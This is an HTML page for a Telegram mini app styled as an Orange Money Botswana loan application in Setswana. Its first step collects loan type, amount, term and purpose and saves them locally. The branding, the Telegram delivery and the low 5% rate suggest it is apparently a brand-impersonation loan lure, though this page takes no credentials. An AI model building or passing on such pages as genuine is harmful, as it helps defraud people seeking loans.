<!DOCTYPE html>
<html lang="tn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money - Kopelo ya Kadimo</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #ff6600;
            --orange-hover: #e55c00;
            --bg-color: #e5e5e5;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-header {
            width: 100%;
            background-color: var(--orange-primary);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
        }

        .header-title .orange { color: #ffffff; opacity: 0.95; margin-right: 4px; }
        .header-title .money { color: #000000; }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            color: white;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: white;
            border-radius: 2px;
        }

        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: space-center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--orange-primary);
        }

        .form-group {
            margin-bottom: 22px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 10px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #333333;
            outline: none;
            width: 100%;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }

        .form-control:focus {
            border-color: var(--orange-primary);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23555555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 16px center;
            background-size: 14px;
            padding-right: 40px;
            cursor: pointer;
        }

        textarea.form-control {
            resize: none;
            height: 95px;
            font-family: inherit;
        }

        .btn-next {
            background-color: var(--orange-primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            margin-top: 15px;
            text-transform: uppercase;
        }

        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #666666;
            margin-top: auto;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a href="/" class="back-btn">← Boetse</a>
    <div class="header-title">
        <span class="orange">Orange</span><span class="money">Money</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Kopelo ya Kadimo</h1>
    <div class="subtext">Kgato ya 1 ya 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
        <div class="step-bar"></div>
    </div>

    <form id="loanForm" onsubmit="submitStep1(event)">
        <div class="form-group">
            <label for="loanType">Mofuta wa Kadimo</label>
            <select id="loanType" class="form-control" required>
                <option value="Kadimo ya Motho ka Yosi" selected>Kadimo ya Motho ka Yosi</option>
                <option value="Kadimo ya Kgwebo">Kadimo ya Kgwebo</option>
                <option value="Kadimo ya Thuto">Kadimo ya Thuto</option>
                <option value="Kadimo ya Tshoganyetso">Kadimo ya Tshoganyetso</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanAmt">Palomadi ya Kadimo (BWP)</label>
            <input type="number" id="loanAmt" class="form-control" placeholder="5000" value="5000" required>
        </div>

        <div class="form-group">
            <label for="loanTerm">Nako ya Kadimo</label>
            <select id="loanTerm" class="form-control" required>
                <option value="3 Dikgwedi">3 Dikgwedi</option>
                <option value="6 Dikgwedi">6 Dikgwedi</option>
                <option value="12 Dikgwedi" selected>12 Dikgwedi</option>
                <option value="24 Dikgwedi">24 Dikgwedi</option>
                <option value="36 Dikgwedi">36 Dikgwedi</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanPurpose">Maikaelelo a Kadimo</label>
            <textarea id="loanPurpose" class="form-control" placeholder="Madi ano a tla diriserwa eng?" required></textarea>
        </div>

        <button type="submit" class="btn-next">KGATO E E LATELANG</button>
    </form>
</div>

<div class="footer-banner">
    © 2026 Orange Money Botswana
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        const savedAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount');
        const savedDuration = localStorage.getItem('loan_term') || localStorage.getItem('loanDuration');

        if (savedAmount) {
            const digitsOnly = savedAmount.toString().replace(/\D/g, '');
            if (digitsOnly) {
                document.getElementById('loanAmt').value = digitsOnly;
            }
        }
    };

    function submitStep1(event) {
        event.preventDefault();

        const loanType = document.getElementById('loanType').value;
        const loanAmt = Number(document.getElementById('loanAmt').value) || 0;
        const loanTermVal = document.getElementById('loanTerm').value;
        const loanPurpose = document.getElementById('loanPurpose').value;

        const months = Number(loanTermVal.replace(/\D/g, '')) || 12;

        const annualRate = 0.05;
        const totalInterest = loanAmt * annualRate * (months / 12);
        const monthlyPayment = Math.round((loanAmt + totalInterest) / months);

        localStorage.setItem('loan_amount', loanAmt);
        localStorage.setItem('amount', loanAmt);
        localStorage.setItem('appliedAmount', loanAmt);

        localStorage.setItem('loan_term', months);
        localStorage.setItem('duration', months);
        localStorage.setItem('appliedTerm', loanTermVal);

        localStorage.setItem('monthly_repayment', monthlyPayment);
        localStorage.setItem('appliedLoanType', loanType);
        localStorage.setItem('appliedPurpose', loanPurpose);

        window.location.href = "/page3"; 
    }
</script>

</body>
</html>
